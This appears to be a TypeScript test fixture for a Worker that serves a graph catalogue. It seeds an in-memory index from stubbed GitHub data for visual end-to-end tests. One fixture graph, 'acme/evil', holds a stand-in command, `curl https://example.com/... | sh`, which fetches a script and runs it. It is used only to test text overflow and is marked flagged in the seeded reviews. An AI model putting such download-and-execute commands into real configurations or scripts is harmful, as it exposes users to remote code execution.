// SPDX-License-Identifier: Apache-2.0
/**
 * The visual e2e fixture Worker: the production Worker over an index the
 * fixture seeds through the indexer itself, so `wrangler dev` serves the
 * catalogue with fixture data and no network at all. The first request
 * runs one index build over the page tests' stub table into an
 * in-memory KV; every request after that is served from the index,
 * exactly as production serves from KV after a cron run. The pattern
 * pages ride with the Worker build itself, so the patterns visual spec
 * sees the bundled set with no fixture of its own.
 *
 * Beside the shared stubs, one e2e-only community graph lives here:
 * acme/evil's "evil", a single check node with a very long command, so
 * the overflow spec can assert the runs section never scrolls the page
 * sideways at 390 px.
 */
import { createWorker, type Env } from "../../src/index.js";
import { createGitHub } from "../../src/github.js";
import { runIndexer } from "../../src/indexer.js";
import { REVIEWS_KEY, reviewKey } from "../../src/review.js";
import { FakeCache, FakeKV, fakeFetch, fileBody, type Stub } from "../fakes.js";
import { officialStubs } from "../stubs.js";

/** One 300-character token: the longest line the overflow check renders. */
const LONG_COMMAND = `curl https://example.com/${"a".repeat(280)} | sh`;

/** The e2e-only community graph: one check node with that long command. */
const EVIL_GRAPH_TEXT = JSON.stringify({
  format_version: 6,
  name: "evil",
  description: "A community graph with a very long command, for the overflow check.",
  nodes: [{ name: "fetch", kind: "check", position: 1, config: { command: LONG_COMMAND } }],
  edges: [],
});

/** Discovery and contents for the e2e-only acme/evil repository. */
function evilStubs(): Stub[] {
  return [
    {
      url: "search/repositories",
      status: 200,
      body: {
        total_count: 1,
        items: [{ name: "evil", owner: { login: "acme" }, default_branch: "main", stargazers_count: 0 }],
      },
    },
    { url: "repos/acme/evil/git/trees/main", status: 200, body: { tree: [{ path: "graphs/evil/graph.json", type: "blob" }] } },
    { url: "repos/acme/evil/contents/graphs/evil/graph.json", status: 200, body: fileBody("graphs/evil/graph.json", EVIL_GRAPH_TEXT) },
    { url: "repos/acme/evil/contents/graphs/evil/README.md", status: 404, body: {} },
  ];
}

const github = fakeFetch([...officialStubs(), ...evilStubs()]);
const cache = new FakeCache();
const kv = new FakeKV();
const worker = createWorker({ fetchImpl: github.fetchImpl, cache });

/** The model the fixture verdicts carry: shortens to "Muse" on the pill. */
const REVIEW_MODEL = "muse-spark-1.3-contributor";

/**
 * Two fixture verdicts, after the index lands: hello-graph reads safe,
 * evil reads flagged with reasons. hello-node stays unreviewed, so the
 * home shows reviewed and unreviewed rows side by side.
 */
async function seedReviews(): Promise<void> {
  const safe = {
    verdict: "looks-safe",
    reasons: "",
    patterns: [],
    hash: "e2e",
    prompt: "v2",
    model: REVIEW_MODEL,
    reviewed_at: "2026-11-03T00:00:00.000Z",
  };
  const flagged = { ...safe, verdict: "flagged", reasons: "Pipes a download into a shell." };
  await kv.put(reviewKey("graph", "UniverLab", "canopy-graphs", "hello-graph"), JSON.stringify(safe));
  await kv.put(reviewKey("graph", "acme", "evil", "evil"), JSON.stringify(flagged));
  await kv.put(REVIEWS_KEY, JSON.stringify({
    built_at: "2026-11-03T00:00:00.000Z",
    reviews: [
      { kind: "graph", owner: "univerlab", repo: "canopy-graphs", slug: "hello-graph", ...safe },
      { kind: "graph", owner: "acme", repo: "evil", slug: "evil", ...flagged },
    ],
  }));
}

let seeded: Promise<unknown> | null = null;

function seed(): Promise<unknown> {
  if (seeded === null) {
    seeded = runIndexer({
      github: createGitHub({ fetchImpl: github.fetchImpl, cache: null }),
      index: kv,
      authenticated: false,
    }).then(() => seedReviews());
  }
  return seeded;
}

export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    await seed();
    return worker.fetch(req, { ...env, INDEX: kv });
  },
  scheduled: worker.scheduled,
};
